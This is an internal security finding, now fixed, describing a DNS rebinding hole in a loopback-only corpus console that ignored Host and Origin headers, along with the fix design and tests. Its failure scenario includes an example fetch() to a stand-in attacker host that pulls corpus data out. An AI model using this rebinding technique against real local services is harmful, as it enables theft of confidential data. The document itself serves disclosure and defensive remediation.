# R2 — the loopback console never validates the `Host` header, so it is open to DNS rebinding

- **Severity:** major
- **Dimension:** console read-only / security (network exposure of a confidential corpus)
- **Branch:** feat/release-fleet-integration
- **Tickets:** #186 (one command serves the console), #188 (debugging views), ADR-0010/0017
- **Status:** fixed

## What is wrong

`packages/latence-console/src/latence_console/server.py:211-257` (`build_server` / `Handler._answer`)

The console's **only** network defence is `_require_loopback(host)` (server.py:195), which refuses to
*bind* anywhere but the loopback interface. Nothing anywhere in the request path looks at the `Host`
header, and nothing looks at `Origin`. `_answer` renders and returns the corpus for whatever the
request line asks for, regardless of which name the client used to reach the socket.

A bind-address check is a **network-layer** control. DNS rebinding defeats it precisely because the
attacker never needs to reach the socket from off-machine — the victim's own browser makes the
request from the victim's own machine, over loopback, and the only thing that distinguishes the
attack from a legitimate visit is the `Host` header the console ignores.

## Failure scenario

1. The operator runs `latence-console ./corpus` over a confidential corpus (default
   `127.0.0.1:8787`) and leaves the tab open.
2. In another tab they visit `attacker.example.com`, whose DNS record carries a 1-second TTL and
   re-resolves to `127.0.0.1`.
3. The attacker's JavaScript issues `fetch('http://attacker.example.com:8787/run/<id>/chunks')`.
   The browser considers this **same-origin** (the origin string is unchanged), so the same-origin
   policy does not block the *read* — and the console answers `200` with the full page.
4. The attacker walks `/`, `/run/<id>/chunks`, `/run/<id>/chunk?id=…`, `/run/<id>/graph` and
   exfiltrates chunk text, PII span types and offsets, file names, source URIs and KG evidence.

Proven with a live socket probe against the real server before the fix: a request line
`GET / HTTP/1.1` with `Host: attacker.example.com` and `Origin: https://evil.example.com` was
answered `HTTP/1.0 200 OK` with a body byte-identical to the legitimate `Host: 127.0.0.1:PORT`
response, containing corpus run ids and content.

The green gate cannot see this: no test under `packages/latence-console/tests/` sends a `Host`
header at all (`urllib` fills in the correct one), so every existing assertion passes both before
and after the fix.

## What to build

An **origin-layer** control in front of the app, alongside the existing network-layer bind refusal:

1. A pure, unit-testable predicate that decides whether a `Host` header names this machine: the
   host part must be `localhost`, `127.0.0.1`, `::1`/`[::1]` (or any loopback IP literal), and the
   port part must equal the port the server is actually bound to. An absent or empty `Host` is
   refused (every browser sends one; HTTP/1.1 requires it).
2. A companion predicate for `Origin`: absent is fine (a plain navigation), but any present
   `Origin` must itself be an `http(s)` loopback origin on the bound port. `Origin: null` is
   refused.
3. `Handler._answer` refuses a request that fails either check with `403` and a rendered
   explanation, **before** `ConsoleApp.respond` is called — no corpus bytes are read, rendered or
   returned. The security headers (CSP, `no-store`, `no-referrer`, `nosniff`) still ride the
   refusal.
4. No change to `ConsoleApp` — it stays a pure request→response core with no header knowledge.

## Acceptance criteria

- [x] A request whose `Host` is a foreign name (`attacker.example.com`, with or without the bound
      port) is answered `403` and its body contains no corpus content.
- [x] A request whose `Host` names loopback but the **wrong port** is refused (a rebinding host can
      pick its own port mapping).
- [x] `Host: 127.0.0.1:PORT`, `Host: localhost:PORT` and `Host: [::1]:PORT` on the bound port are
      answered normally (`200`).
- [x] A cross-site `Origin` on an otherwise-valid `Host` is refused `403`; an absent `Origin` is
      accepted.
- [x] A missing/empty `Host` is refused `403`.
- [x] The refusal carries the same CSP / `Cache-Control` / `Referrer-Policy` /
      `X-Content-Type-Options` headers as any other answer.
- [x] Non-vacuous regression test (`tests/test_host_guard.py`) drives a **real socket** with raw
      request bytes; it fails on the pre-fix server (200 + corpus body) and passes on the fix.
- [x] `make test` stays at or above 2985 passed / 28 skipped; ruff + mypy --strict clean.
